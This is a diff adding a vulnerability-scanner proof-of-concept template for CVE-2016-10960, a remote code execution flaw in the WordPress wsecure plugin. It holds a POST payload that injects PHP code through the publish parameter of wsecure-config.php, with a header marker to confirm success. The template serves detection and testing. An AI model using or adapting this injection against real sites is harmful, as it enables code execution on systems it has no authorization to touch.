@@ -1,0 +1,34 @@
+[info]
+author = "AVE"
+description = "通过向 wsecure-config.php 发送特制 POST 请求，在 publish 参数中注入 PHP 代码闭合字符串并设置自定义响应头，若响应头中包含该自定义标记则证明存在远程代码执行漏洞。"
+id = "POC-AVE-2016-0049"
+name = "WordPress wsecure插件 远程代码执行漏洞 PoC"
+severity = "high"
+tags = ["ave-2016-0049"]
+vuln_id = [
+    "CVE-2016-10960",
+    "AVE-2016-0049",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/wp-content/plugins/wsecure/wsecure-config.php"
+protocol = "http"
+
+[poc.requests.body]
+content = 'wsecure_action=update&publish=";} header("AVE: CVE-2016-10960"); class WSecureConfig2 {var $test="'
+type = "raw"
+
+[[poc.requests.matchers]]
+expect = true
+part = "header"
+type = "word"
+words = ["AVE: CVE-2016-10960"]
+
+[[poc.requests.matchers]]
+expect = true
+status = [200]
+type = "status"
